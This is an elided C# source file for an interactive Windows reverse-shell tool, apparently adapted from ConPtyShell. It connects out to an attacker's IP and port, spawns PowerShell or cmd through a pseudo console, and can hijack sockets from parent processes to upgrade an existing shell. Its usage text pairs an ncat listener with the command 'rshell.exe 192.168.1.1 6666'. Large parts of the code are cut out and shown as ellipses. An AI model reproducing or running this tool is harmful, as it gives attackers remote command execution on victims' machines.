...
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 -nologo -debug -out:ConPtyShell.exe .\ConPtyShell.cs
...
{
    private const string error_string = "[-] BadException: ";
    public BadException() { }
    public BadException(string message) : base(error_string + message) { }
}
...
public static class SocketHijacking
{
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new BadException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new BadException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
...
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new BadException(status.ToString());
        try
        {
...
public static class RevSh
{
    private const string errorString = "{{{BadException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new BadException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    ...
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new BadException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new BadException(String.Format("WSA Connect failed with error code: {0}", error));
        }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new BadException("Could not create the Input Pipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new BadException("Could not create the Output Pipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new BadException("Console mode failed");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new BadException("Virtual terminal processing failed");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr RevShInputPipeRead, ref IntPtr RevShOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        ...
        result = CreatePseudoConsole(consoleCoord, RevShInputPipeRead, RevShOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new BadException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new BadException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new BadException("Could not set pseudo console thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    ...
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new BadException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string ShellSpawn(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        ...
        if (RevShCompatible)
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning interactive shell\r\n");
            if (upgradeShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new BadException("Socket duplication failed.");
                        }
                        else
                        {
            ...
            {
                output += string.Format("{0}Could not create pseudo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
        ...
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shell");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
...
public static class ShellMainClass
{
    ...
    Run:
    rlwrap ncat -lnvp 6666

    Then:
    rshell.exe 192.168.1.1 6666

    With specific rows and cols:
    rshell.exe 10.0.0.2 3001 30 90 cmd.exe - Default: is powershell.exe

    Upgrade current shell with specific rows and cols size:
    rshell.exe upgrade shell 30 90
";
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            //throw new BadException("\r\nInvalid remoteIp value" + ipString);
            Console.WriteLine("\r\nInvalid remoteIp value" + ipString);
        return ipString;
    }
    ...
    public static string ShellMain(string[] args)
    {
        ...
        else
        {
            ...
            try
            {
                ...
                output = RevSh.ShellSpawn(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
